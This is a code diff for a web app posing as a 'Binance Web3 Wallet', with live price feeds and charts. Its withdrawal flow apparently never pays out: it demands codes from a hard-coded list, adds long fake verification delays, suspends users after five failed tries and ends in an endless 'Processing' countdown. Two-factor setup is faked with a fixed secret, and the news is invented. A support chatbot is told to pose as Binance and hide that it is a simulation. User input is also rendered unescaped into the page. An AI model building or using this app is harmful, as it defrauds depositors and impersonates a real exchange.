+            document.getElementById('withdrawalAddress').value = appState.walletAddress;
+        }
+
+        function fillMaxAmount() {
+            const usdtToken = appState.heldTokens.find(t => t.symbol === 'USDT');
+            const maxAmount = usdtToken ? usdtToken.balance : appState.balances.totalUSD;
+            document.getElementById('withdrawalAmount').value = maxAmount.toFixed(2);
+        }
+
+        function showWithdrawalConfirmationPage() {
+            const address = document.getElementById('withdrawalAddress').value.trim();
+            const network = document.getElementById('withdrawalNetwork').value;
+            const amountInput = document.getElementById('withdrawalAmount');
+            const amount = parseFloat(amountInput.value);
+
+            if (isSuspended()) {
+                showMessage('Suspended', 'Withdrawal is currently suspended.', 'error');
+                return;
+            }
+            if (!address || !network || isNaN(amount) || amount <= 0 || amount > appState.balances.totalUSD) {
+                showMessage('Invalid Details', 'Please enter a valid address, select a network, and ensure the amount is valid and less than your total balance.', 'error');
+                return;
+            }
+
+            currentWithdrawal = { address, network, amount, coin: 'USDT' };
+
+            document.getElementById('confirmAmount').textContent = `$${amount.toFixed(2)} USD`;
+            document.getElementById('withdrawalValidationCode').value = '';
+            document.getElementById('withdrawalCodeError').classList.add('hidden');
+            showPage('withdrawalConfirmationPage');
+        }
+
+        async function handleWithdrawalConfirmation() {
+            const codeInput = document.getElementById('withdrawalValidationCode');
+            const code = codeInput.value.trim();
+            const errorMsg = document.getElementById('withdrawalCodeError');
+            const now = Date.now();
+
+            if (!code) {
+                errorMsg.textContent = 'Enter your validation code.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            errorMsg.classList.add('hidden');
+            showLoading('Verifying code...');
+            await waitFor(15000); // 15-second loading
+
+            // Check if code is already used
+            const lastUsed = appState.withdrawalAttempts[code];
+            if (lastUsed && now - lastUsed < (24 * 60 * 60 * 1000) * 2) {
+                appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
+                saveState();
+                hideLoading();
+                errorMsg.textContent = 'Code already used within the last 48 hours.';
+                errorMsg.classList.remove('hidden');
+                handleFailedAttempt(errorMsg);
+                return;
+            }
+
+            if (!VALID_WITHDRAW_CODES.includes(code)) {
+                appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
+                saveState();
+                hideLoading();
+                errorMsg.textContent = 'Validation failed. Please enter the correct code.';
+                errorMsg.classList.remove('hidden');
+                handleFailedAttempt(errorMsg);
+                return;
+            }
+
+            // SUCCESS LOGIC: Start 24-hour countdown
+            appState.withdrawalAttempts = { failedCount: 0 }; // Reset attempts
+            appState.withdrawalAttempts[code] = now; // Mark code as used
+            appState.withdrawalCountdownEnd = now + (24 * 60 * 60 * 1000); // 24 hours
+            appState.activities.unshift({
+                type: 'Withdrawal',
+                desc: `Withdrawal of ${currentWithdrawal.amount.toFixed(2)} ${currentWithdrawal.coin} initiated.`,
+                date: new Date().toISOString(),
+                status: 'Processing',
+                address: currentWithdrawal.address,
+                network: currentWithdrawal.network,
+                amount: currentWithdrawal.amount
+            });
+            saveState();
+            hideLoading();
+            showWithdrawalProcessingPage();
+        }
+
+        function handleFailedAttempt(errorMsg) {
+            const failedCount = appState.withdrawalAttempts.failedCount;
+
+            if (failedCount >= 5) {
+                appState.withdrawalSuspensionEnd = Date.now() + (48 * 60 * 60 * 1000); // 48 hours
+                appState.withdrawalAttempts.failedCount = 0; // Reset counter for next suspension period
+                saveState();
+                showMessage('Suspension', 'Withdrawal function suspended for 48 hours due to 5 incorrect code attempts.', 'error');
+                showPage('home'); // Go back to home to show activity status
+                return;
+            }
+
+            errorMsg.textContent += ` (Attempt ${failedCount} of 5)`;
+        }
+
+        function showWithdrawalProcessingPage() {
+            const activity = appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing');
+            if (activity) {
+                document.getElementById('procAddress').textContent = activity.address;
+                document.getElementById('procNetwork').textContent = activity.network;
+                document.getElementById('procAmount').textContent = `$${activity.amount.toFixed(2)} USD`;
+                showPage('withdrawalProcessingPage');
+            } else {
+                showMessage('Error', 'No active withdrawal found.', 'error');
+                showPage('home');
+            }
+        }
+
+        // =======================================================
+        // 6. MARKET & CHART LOGIC
+        // =======================================================
+
+        /**
+         * Initializes TradingView Chart Widget.
+         */
+        function initTradingView(containerId, symbol) {
+            if (typeof TradingView === 'undefined') {
+                console.error("TradingView script not loaded.");
+                return;
+            }
+
+            // Check if the chart already exists to prevent duplication
+            const container = document.getElementById(containerId);
+            if (container.querySelector('iframe')) return;
+
+            new TradingView.widget(
+                {
+                    "container_id": containerId,
+                    "autosize": true,
+                    "symbol": `BINANCE:${symbol}`,
+                    "interval": "D",
+                    "timezone": "Etc/UTC",
+                    "theme": "dark",
+                    "style": "1",
+                    "locale": "en",
+                    "toolbar_bg": "#f1f3f6",
+                    "enable_publishing": false,
+                    "allow_symbol_change": true,
+                    "save_image": false,
+                    "studies": [
+                        "ROC@tv-basicstudies",
+                        "StochasticRSI@tv-basicstudies",
+                        "MASimple@tv-basicstudies"
+                    ],
+                    "overrides": {
+                        "paneProperties.background": "#17171d",
+                        "paneProperties.vertGridProperties.color": "#24242d",
+                        "paneProperties.horzGridProperties.color": "#24242d",
+                        "symbolWatermarkProperties.color": "rgba(255, 255, 255, 0.05)"
+                    }
+                }
+            );
+        }
+
+        function updateHomeDashboard() {
+            // Initialize main BTC/USDT chart
+            initTradingView('tvChartContainer', 'BTCUSDT');
+            loadHotCoins();
+        }
+
+        async function loadHotCoins() {
+            const listContainer = document.getElementById('hotCoinsList');
+            if (!listContainer) return;
+
+            if (hotCoinsCache.length === 0) {
+                try {
+                    const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=6&page=1&sparkline=false`);
+                    if (!response.ok) throw new Error('Failed to fetch hot coins');
+                    hotCoinsCache = await response.json();
+                } catch (e) {
+                    listContainer.innerHTML = '<p class="col-span-2 text-danger text-center py-4">Failed to load hot coins.</p>';
+                    return;
+                }
+            }
+
+            let html = '';
+            hotCoinsCache.forEach(coin => {
+                const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
+                const changeSign = coin.price_change_percentage_24h >= 0 ? '+' : '';
+
+                html += `
+                    <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="bg-card p-4 rounded-xl cursor-pointer hover:bg-surface transition-colors space-y-2 border border-gray-800">
+                        <div class="flex items-center space-x-2">
+                            <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/20x20/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-5 h-5 rounded-full" />
+                            <p class="font-semibold text-sm">${coin.symbol.toUpperCase()}</p>
+                        </div>
+                        <p class="text-lg font-bold">$${coin.current_price.toFixed(2)}</p>
+                        <p class="text-xs ${changeClass}">${changeSign}${coin.price_change_percentage_24h.toFixed(2)}% (24h)</p>
+                    </div>
+                `;
+            });
+
+            listContainer.innerHTML = html;
+        }
+
+        function showCoinChartModal(symbol) {
+            const chartId = 'coinChartModalContainer';
+            const modalId = 'coinChartModal';
+
+            // Create a temporary modal structure
+            let modal = document.getElementById(modalId);
+            if (!modal) {
+                modal = document.createElement('div');
+                modal.id = modalId;
+                modal.className = 'fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50';
+                modal.innerHTML = `
+                    <div class="modal-content w-full max-w-lg p-4 space-y-4">
+                        <h3 class="text-xl font-bold">${symbol}/USDT Live Chart</h3>
+                        <div class="bg-card rounded-xl overflow-hidden" style="height: 350px;">
+                            <div id="${chartId}" class="w-full h-full"></div>
+                        </div>
+                        <button onclick="hideModal('${modalId}')" class="w-full btn-primary">Close</button>
+                    </div>
+                `;
+                document.body.appendChild(modal);
+            }
+
+            document.getElementById(modalId).classList.remove('hidden');
+            document.getElementById(modalId).classList.add('flex');
+
+            // Initialize the specific chart
+            // Timeout is needed to ensure the DOM element is rendered before TradingView tries to attach
+            setTimeout(() => {
+                initTradingView(chartId, `${symbol}USDT`);
+            }, 100);
+        }
+
+        async function loadMarketData() {
+            const mktCap = document.getElementById('mktCap');
+            const mktVol = document.getElementById('mktVol');
+            const topCoinsList = document.getElementById('topCoinsList');
+            const newsContent = document.getElementById('newsContent');
+
+            mktCap.textContent = '...';
+            mktVol.textContent = '...';
+            topCoinsList.innerHTML = '<p class="text-muted text-center py-4">Loading top coins...</p>';
+            newsContent.innerHTML = '<p class="text-muted">Fetching latest news...</p>';
+
+            try {
+                // 1. Fetch Top Coins and Market Overview
+                const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false`);
+                if (!response.ok) throw new Error('Failed to fetch market data');
+                const coins = await response.json();
+
+                // 2. Simulate Market Overview (from the first coin for simplicity, or sum all)
+                let totalMktCap = coins.reduce((acc, coin) => acc + (coin.market_cap || 0), 0);
+                let total24hVol = coins.reduce((acc, coin) => acc + (coin.total_volume || 0), 0);
+
+                const format = (num) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', notation: 'compact' }).format(num);
+
+                mktCap.textContent = format(totalMktCap);
+                mktVol.textContent = format(total24hVol);
+
+                // 3. Render Top Coins List
+                let coinHtml = coins.map(coin => {
+                    const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
+                    const changeSign = coin.price_change_percentage_24h >= 0 ? '▲' : '▼';
+                    return `
+                        <div class="flex items-center justify-between p-3 bg-surface rounded-lg border border-gray-800">
+                            <div class="flex items-center space-x-3">
+                                <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/24x24/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-6 h-6 rounded-full" />
+                                <div>
+                                    <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
+                                    <p class="text-xs text-muted">${coin.name}</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-semibold">$${coin.current_price.toFixed(2)}</p>
+                                <p class="text-xs ${changeClass}">${changeSign} ${Math.abs(coin.price_change_percentage_24h).toFixed(2)}%</p>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+                topCoinsList.innerHTML = coinHtml;
+
+                // 4. Simulate Market News/Launch Pool
+                let launchCoin = coins.find(c => c.symbol.toLowerCase() === 'bnb') || coins[0];
+                newsContent.innerHTML = `
+                    <div class="p-3 bg-yellow-900/30 rounded-lg text-sm border border-yellow-700">
+                        <p class="font-semibold text-yellow-400">Launch Pool:</p>
+                        <p class="text-xs text-muted">Stake **${launchCoin.symbol.toUpperCase()}** to earn rewards in the new DeFi project launch. Starts in 48 hours!</p>
+                    </div>
+                    <p class="text-xs text-muted">**Market News:** Bitcoin dominance remains strong above 50% as institutional interest continues to rise.</p>
+                    <p class="text-xs text-muted">**Live Prices:** Market data is updated from CoinGecko Public API every minute.</p>
+                `;
+
+            } catch (e) {
+                console.error("Error loading market data:", e);
+                topCoinsList.innerHTML = '<p class="text-danger text-center py-4">Failed to load market data.</p>';
+            }
+        }
+
+        // =======================================================
+        // 7. ACCOUNT & SECURITY LOGIC
+        // =======================================================
+        function updateAccountPage() {
+            document.getElementById('accountUserID').textContent = appState.isConnected ? appState.userID : '---';
+            document.getElementById('accountWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
+            document.getElementById('accountWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
+        }
+
+        function updateAccountDetailsPage() {
+            document.getElementById('detailUserID').textContent = appState.isConnected ? appState.userID : '---';
+            document.getElementById('detailWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
+            document.getElementById('detailWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
+        }
+
+        function updateGoogleAuthPage() {
+            document.getElementById('authUserID').textContent = appState.isConnected ? appState.userID : '---';
+
+            // Simulate QR Code and Secret Key generation using a placeholder
+            const secretKey = 'A1B2C3D4E5F6G7H8';
+            const issuer = 'BinanceWeb3';
+            const accountName = appState.userID;
+            const otpAuthUri = `otpauth://totp/${issuer}:${accountName}?secret=${secretKey}&issuer=${issuer}`;
+
+            // We cannot use a real Google Auth API, so we use a placeholder QR and the fixed secret
+            const qrContainer = document.getElementById('authQrCode');
+            qrContainer.innerHTML = '';
+            new QRCode(qrContainer, {
+                text: otpAuthUri,
+                width: 160,
+                height: 160,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+            document.getElementById('authSecretKey').textContent = secretKey;
+        }
+
+        async function verifyGoogleAuthCode() {
+            const code = document.getElementById('authCodeInput').value.trim();
+            const errorMsg = document.getElementById('authCodeError');
+
+            if (!code || code.length !== 6 || isNaN(code)) {
+                errorMsg.textContent = 'Please enter a valid 6-digit code.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            errorMsg.classList.add('hidden');
+            showLoading('Verifying Code...');
+            await waitFor(5000); // 5-second loading for simulation
+
+            // Simulated verification logic (only accept '123456' or '654321' for simulation)
+            if (code === '123456' || code === '654321') {
+                hideLoading();
+                appState.isConnected = true; // Security is linked, keep wallet connected
+                saveState();
+                showMessage('Verification Successful!', 'Google Authenticator is now linked to your account.', 'success');
+                showPage('accountDetails');
+            } else {
+                hideLoading();
+                errorMsg.textContent = 'Verification failed. Please check the code and try again.';
+                errorMsg.classList.remove('hidden');
+            }
+        }
+
+        // =======================================================
+        // 8. NOTIFICATION & SEARCH LOGIC
+        // =======================================================
+        function toggleNotifications(isOn) {
+            appState.notificationOn = isOn;
+            saveState();
+            updateNotificationPage();
+        }
+
+        function updateNotificationPage() {
+            const toggle = document.getElementById('notificationToggle');
+            if (toggle) toggle.checked = appState.notificationOn;
+
+            const notificationList = document.getElementById('notificationList');
+            notificationList.innerHTML = appState.activities.filter(a => a.type === 'Deposit' || a.type === 'Withdrawal')
+                .map(a => `
+                    <div class="bg-card p-4 rounded-xl border-l-4 ${a.status === 'Success' ? 'border-success' : a.status === 'Failed' ? 'border-danger' : 'border-yellow-400'}">
+                        <p class="font-semibold">${a.type} ${a.status}</p>
+                        <p class="text-sm text-muted">${a.desc}</p>
+                        <p class="text-xs text-muted mt-1">${new Date(a.date).toLocaleString()}</p>
+                    </div>
+                `).join('');
+
+            // Add simulated market notifications
+            notificationList.innerHTML += `
+                <div class="bg-card p-4 rounded-xl border-l-4 border-yellow-400">
+                    <p class="font-semibold">Market News Update</p>
+                    <p class="text-sm text-muted">BTC price surged past $68,000 overnight. Volatility high.</p>
+                    <p class="text-xs text-muted mt-1">${new Date().toLocaleTimeString()} - Today</p>
+                </div>
+                <div class="bg-card p-4 rounded-xl border-l-4 border-success">
+                    <p class="font-semibold">Launch Pool Reminder</p>
+                    <p class="text-sm text-muted">New staking opportunities available for BNB holders.</p>
+                    <p class="text-xs text-muted mt-1">Yesterday</p>
+                </div>
+            `;
+        }
+
+        async function showDailyNotificationBanner() {
+            const banner = document.getElementById('dailyNotificationBanner');
+            const now = Date.now();
+            const twelveHours = 12 * 60 * 60 * 1000;
+
+            if (appState.notificationOn && now - appState.lastNotificationTime > twelveHours) {
+                try {
+                    // Fetch a random trending coin for the "news" banner
+                    const response = await fetch(`${COINGECKO_API}/search/trending`);
+                    const data = await response.json();
+                    const trendingCoin = data.coins[0]?.item;
+                    if (trendingCoin) {
+                        document.getElementById('dailyNotificationMessage').textContent =
+                            `🚀 Trending: ${trendingCoin.name} (${trendingCoin.symbol.toUpperCase()}) is up ${trendingCoin.data.price_change_percentage_24h.usd.toFixed(2)}% in the last 24h!`;
+                        banner.classList.remove('hidden');
+                        appState.lastNotificationTime = now;
+                        saveState();
+                    }
+                } catch (e) {
+                    console.error("Failed to fetch trending coin for banner:", e);
+                }
+            }
+        }
+
+        function hideDailyNotification() {
+            document.getElementById('dailyNotificationBanner').classList.add('hidden');
+        }
+
+        // =======================================================
+        // 9. SEARCH LOGIC
+        // =======================================================
+
+        let searchTimeout;
+        document.getElementById('globalSearchInput').addEventListener('input', () => {
+            clearTimeout(searchTimeout);
+            searchTimeout = setTimeout(performGlobalSearch, 500);
+        });
+
+        async function performGlobalSearch() {
+            const query = document.getElementById('globalSearchInput').value.trim();
+            const resultsDiv = document.getElementById('searchResults');
+
+            if (query.length < 2) {
+                resultsDiv.innerHTML = '<p class="text-sm text-muted text-center py-4">Start typing to search coins, markets, and news.</p>';
+                return;
+            }
+
+            resultsDiv.innerHTML = '<p class="text-sm text-yellow-400 text-center py-4">Searching...</p>';
+
+            try {
+                // Search CoinGecko API for coins
+                const response = await fetch(`${COINGECKO_API}/search?query=${query}`);
+                if (!response.ok) throw new Error('Search failed');
+                const data = await response.json();
+
+                let html = '<h3 class="font-semibold text-lg border-b border-gray-800 pb-2 mb-2">Coins Found</h3>';
+
+                if (data.coins.length > 0) {
+                    html += data.coins.map(coin => `
+                        <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="flex items-center justify-between p-2 bg-card rounded-lg cursor-pointer hover:bg-surface">
+                            <div class="flex items-center space-x-3">
+                                <img src="${coin.thumb}" class="w-6 h-6 rounded-full" />
+                                <div>
+                                    <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
+                                    <p class="text-xs text-muted">${coin.name}</p>
+                                </div>
+                            </div>
+                            <p class="text-xs text-yellow-400">View Chart &rarr;</p>
+                        </div>
+                    `).join('');
+                } else {
+                    html += '<p class="text-sm text-muted">No coins match your search.</p>';
+                }
+
+                // Simulate News/Market Results
+                html += `
+                    <h3 class="font-semibold text-lg border-b border-gray-800 pb-2 mb-2 mt-4">Market & News</h3>
+                    <div class="bg-card p-3 rounded-lg text-sm space-y-1">
+                        <p class="font-semibold">Market News</p>
+                        <p class="text-xs text-muted">Showing results for market news related to "${query}".</p>
+                    </div>
+                `;
+
+                resultsDiv.innerHTML = html;
+
+            } catch (e) {
+                resultsDiv.innerHTML = '<p class="text-danger text-center py-4">An error occurred during search.</p>';
+            }
+        }
+
+        // =======================================================
+        // 10. CHATBOT LOGIC (Simulated Gemini API)
+        // =======================================================
+        async function sendChatMessage() {
+            const chatInput = document.getElementById('chatInput');
+            const chatMessages = document.getElementById('chatMessages');
+            const userMessage = chatInput.value.trim();
+
+            if (!userMessage) return;
+
+            // 1. Display user message
+            const userMsgHtml = `
+                <div class="flex justify-end">
+                    <div class="bg-yellow-400 text-black p-3 rounded-xl rounded-br-none max-w-[80%] shadow-md">${userMessage}</div>
+                </div>
+            `;
+            chatMessages.innerHTML += userMsgHtml;
+            chatInput.value = '';
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            // 2. Display loading/bot response area
+            const botLoadingId = 'bot-loading-' + Date.now();
+            const botLoadingHtml = `
+                <div class="flex justify-start" id="${botLoadingId}">
+                    <div class="bg-card text-text p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">
+                        <div class="animate-pulse">...thinking...</div>
+                    </div>
+                </div>
+            `;
+            chatMessages.innerHTML += botLoadingHtml;
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            try {
+                // Simulated API call structure
+                const systemPrompt = "You are a friendly and knowledgeable Binance Web3 Wallet support assistant. Keep your responses concise and helpful. Do not mention that this is a simulation. Do not use markdown formatting.";
+                const userQuery = userMessage;
+
+                const payload = {
+                    contents: [{ parts: [{ text: userQuery }] }],
+                    systemInstruction: { parts: [{ text: systemPrompt }] },
+                };
+
+                const response = await fetch(GEMINI_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                const botResponseText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Sorry, I'm having trouble connecting to the service right now. Please try again later.";
+
+                // 3. Replace loading state with actual response
+                const loadingElement = document.getElementById(botLoadingId);
+                if (loadingElement) {
+                    loadingElement.outerHTML = `
+                        <div class="flex justify-start">
+                            <div class="bg-card text-text p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-md">${botResponseText}</div>
+                        </div>
+                    `;
+                }
+            } catch (e) {
+                console.error("Gemini API simulation failed:", e);
+                const loadingElement = document.getElementById(botLoadingId);
+                if (loadingElement) {
+                    loadingElement.outerHTML = `
+                        <div class="flex justify-start">
+                            <div class="bg-danger/20 text-danger p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-md">
+                                Support service connection failed. Please check your network.
+                            </div>
+                        </div>
+                    `;
+                }
+            }
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        // =======================================================
+        // 11. INITIALIZATION & MAIN LOOP
+        // =======================================================
+
+        function initApp() {
+            loadState();
+            updateUI();
+
+            // Handle page persistence on refresh
+            showPage(appState.currentPage);
+
+            // Start countdown and suspension checks
+            setInterval(checkCountdownAndSuspension, 1000);
+
+            // Show daily market notification banner
+            showDailyNotificationBanner();
+            setInterval(showDailyNotificationBanner, 60 * 60 * 1000); // Check every hour
+
+            // If a countdown is running, ensure we are on the processing page
+            if (appState.withdrawalCountdownEnd > Date.now()) {
+                showPage('withdrawalProcessingPage');
+            }
+
+            // Global event listeners for going back
+            document.getElementById('header').addEventListener('click', (e) => {
+                // If a non-main page is active, simulate back button behavior
+                const nonMainPages = ['notification', 'search', 'chat', 'depositCoinSelectionPage', 'withdrawalDetailsPage', 'accountDetails', 'googleAuthVerification'];
+                if (e.target.closest('button')) return; // Ignore button clicks in the header
+
+                if (nonMainPages.includes(appState.currentPage)) {
+                    // Simple back logic: Deposit flows go back one step, others go home/account
+                    if (appState.currentPage === 'depositNetworkPage') showPage('depositCoinSelectionPage');
+                    else if (appState.currentPage === 'depositAddressPage') showPage('depositNetworkPage');
+                    else if (appState.currentPage === 'depositConfirmPage') showPage('depositAddressPage');
+                    else if (appState.currentPage === 'withdrawalDetailsPage') showPage('home');
+                    else if (appState.currentPage === 'withdrawalConfirmationPage') showPage('withdrawalDetailsPage');
+                    else if (appState.currentPage === 'accountDetails' || appState.currentPage === 'googleAuthVerification') showPage('account');
+                    else showPage('home');
+                }
+            });
+
+            // Initial load of complex pages (Home/Market)
+            updateHomeDashboard();
+        }
+
+        window.onload = initApp;
+
+    </script>
+
+</body>
+</html>
